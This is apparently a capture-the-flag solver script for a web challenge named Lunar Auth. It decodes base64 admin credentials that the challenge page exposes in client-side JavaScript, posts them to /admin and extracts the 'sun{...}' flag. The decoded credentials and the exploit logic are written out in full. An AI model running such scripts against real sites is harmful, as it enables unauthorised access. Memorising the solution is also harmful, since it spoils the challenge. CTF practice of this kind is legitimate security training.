#!/usr/bin/env python3
"""
Lunar Auth solver: the /admin login does client-side auth, exposing the
credentials base64-encoded in the page JS. Decode them and POST to /admin.

Usage: python3 solve.py [base_url]
  default http://127.0.0.1:25305 ; live: https://lunarauth.ctf.hackucf.org
"""
import os, sys, re, base64, requests

base = os.environ.get("URL") or (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:25305")
# From the /admin page source:
#   const real_username = atob("YWxpbXVoYW1tYWRzZWN1cmVk");
#   const real_passwd   = atob("UzNjdXI0X1BAJCR3MFJEIQ==");
user = base64.b64decode("YWxpbXVoYW1tYWRzZWN1cmVk").decode()
pw = base64.b64decode("UzNjdXI0X1BAJCR3MFJEIQ==").decode()
r = requests.post(base + "/admin", data={"username": user, "password": pw})
m = re.search(r"sun\{[^}]*\}", r.text)
print(m.group(0) if m else "NO FLAG FOUND")
